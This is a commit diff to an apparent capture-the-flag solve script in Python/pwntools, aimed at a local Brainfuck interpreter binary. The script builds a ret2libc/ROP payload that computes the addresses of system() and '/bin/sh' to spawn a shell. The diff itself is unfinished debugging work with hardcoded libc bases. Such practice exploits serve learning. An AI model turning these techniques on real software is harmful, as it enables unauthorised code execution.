7a1e94ffcff0f4a21c68bfb85144c103d342d4bb
Noy Pearl <11259340+noypearl@users.noreply.github.com>
2024-06-20 13:51:22 +0300

    backuppp

--- brainfk/solve.py
+++ brainfk/solve.py
@@ -11,27 +11,30 @@ exe = ELF("./bf")
 # Libc
 libc = exe.libc
 #libc_base = 0xf7e1b000 # TODO - re-adjust base - I changed it cuz of gdb 
-libc_base = 0xf7e0a000 # TODO - re-adjust base - I changed it cuz of gdb 
+libc_base = 0xf7e1b000 # TODO - re-adjust base - I changed it cuz of gdb 
+#libc_base = 0xf7e0a000 # TODO - re-adjust base - I changed it cuz of gdb 
 libc.address = libc_base
 puts_addr = p32(next(libc.search(b"puts")))
 #execve_addr = p32(next(libc.search(b"libc_system")))
-system_addr = libc.symbols["system"]
-sh_addr = system_addr + 0x120d7b
 puts_addr = libc.symbols["puts"]
 puts_plt = p32(exe.plt['puts'])
-print(f"sh_addr: {hex(sh_addr)}")
 #print(f"puts plt: {puts_plt}")
 
 rop = ROP(libc)
 rop_addr = rop.ebx.address
-rop.execve(sh_addr,0,0)
+#rop.execve(sh_addr,0,0)
 #my_rop = b'p\xb3\xec\xf7baaa\n\x00\x00\x00' # sleep 10
 #my_rop = b'\xc0\xb8\xec\xf7baaa+k\xf7\xf7\x10\x00\x00\x00/usr/bin/ls\x00' #ls
 #0x000183a5
-#my_rop = rop.ebx.address
-my_rop = bytes(rop)
-print(f"ROP: {bytes(rop)}")
-print(f"DUMP: {rop.dump()}")
+target = libc_base + 0x001134d9
+my_rop = p32(target)
+#my_rop = p32(rop.ebx.address)
+#my_rop = bytes(rop)
+print(f"ROP: {my_rop}")
+# 0x00111ef1 : setne al ; add esp, 0x74 ; pop ebx ; pop edi ; ret
+
+print(f"ROP offset: {hex(rop.ebx.address)}")
+#print(f"DUMP: {my_rop.dump()}")
 # Start process
 conn = process("./bf")
 #conn = gdb.debug("./bf",
@@ -44,18 +47,24 @@ with open("payload", "w") as f:
     f.write("")
 #payload = ",.,.<\nAB\n".encode() # --> should work
 # 1st part - before the input - just the commands
-payload = ""
-#payload += "<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
-payload += "<" * 112 #move back 136 bytes -,.\nAB\n".encode() # --> should work
-payload += ",>,>,>," # putchar - for sending the last char
-payload += "." # call to putchar()
-payload += "BBBBBBBB" # call to putchar()
-#payload += ".CCaC"*100 # call to puts()
-#payload += "[" # call to puts()
-payload +="\n"
+system_addr = libc.symbols["system"]
+print(f"system_addr: {str(system_addr)}")
+padding = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa"  
+# fill stack with arbitrary values so I can increase esp and prepare stack for
+#payload = padding +sh_addr + system_addr
+sh_addr = system_addr + 0x120d7b
+
+payload = padding  + p32(sh_addr) + p32(system_addr)
+print(f"sh_addr: {str(sh_addr)}")
+payload += b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
+#payload += "<" * 128 #move back 136 bytes -,.\nAB\n".encode() # --> should work
+payload += b",>,>,>," # putchar - for sending the last char
+payload += b"[" # call to puts()
+payload +=b"\n"
 conn.send(payload)
+#payload += "." # call to putchar()
 # 2nd part - the input to write ( the function to jump to ) 
-with open("payload", "w+") as f:
+with open("payload", "wb+") as f:
     f.write(payload)
 # separate sends cuz of annoying encoding / decoding issue with p32() and
 # strings
@@ -64,9 +73,11 @@ pop_eax_address = my_rop
 #print(f" POP: {hex(pop_eax_address)}")
 #payload = p32(pop_eax_address) # pop eax  - I might need to call it like 0x128
 #payload = bytes(my_rop)
-payload = p32(0xf7e55db0) # system()
-payload += p32(0x41414141) # system()
-payload += p32(0x41414141) # system()
+payload = my_rop
+payload += my_rop
+payload += my_rop
+payload += my_rop
+#payload = p32(0xf7e55db0) # system()
 payload += p32(0x41414141) # system()
 #payload += my_rop # pop eax  - I might need to call it like 0x128
 payload +=b"\n"
